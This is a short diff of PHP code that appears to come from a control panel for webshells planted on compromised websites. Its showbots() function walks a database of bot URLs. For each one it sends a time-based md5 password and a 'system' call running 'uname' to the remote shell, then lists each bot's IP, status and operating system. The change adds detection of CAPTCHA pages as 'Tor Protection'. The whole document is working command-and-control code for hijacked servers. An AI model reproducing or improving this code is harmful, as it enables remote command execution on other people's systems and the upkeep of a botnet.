@@ -147,8 +147,8 @@ function showbots() {
 		
 		if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
 			$status = 'OK';
-		} elseif (strpos($source, 'CloudFlare')) {
-			$status = 'CloudFlare Protection';
+		} elseif (strpos($source, 'CAPTCHA')) {
+			$status = 'Tor Protection';
 		} else {
 			$status = 'BAD';
 		}
@@ -192,14 +192,18 @@ $id = 0;
 while($row = mysqli_fetch_assoc($rows)) {
 
 
-$source = conn($row['url'] . '?PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&_=system&__=uname');
-if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
-$status = 'OK';
-$os = explode("{:|", $source);
-} else {
-$os[3] = 'Not connected';
-$status = 'BAD';
+	$source = conn($row['url'] . '?PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&_=system&__=uname');
+
+	if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
+		$status = 'OK';
+		$os = explode("{:|", $source);
+	} elseif (strpos($source, 'CAPTCHA')) {
+		$status = 'Tor Protection';
+	} else {
+		$os[3] = 'Not connected';
+		$status = 'BAD';
 }
+		
 $urlp = parse_url($row['url']);
 echo '<tr><td>'.$row['id'].'.</td><td><a href="'.htmlspecialchars($row['url']).'">'.htmlspecialchars($row['url']).'</a></td><td><a href="http://www.whois.com/whois/'.gethostbyname($urlp["host"]).'">'.gethostbyname($urlp["host"]).'<a></td><td>'.$status.'</td><td>'.$os[3].'</td>';
 if ($status == 'OK') {
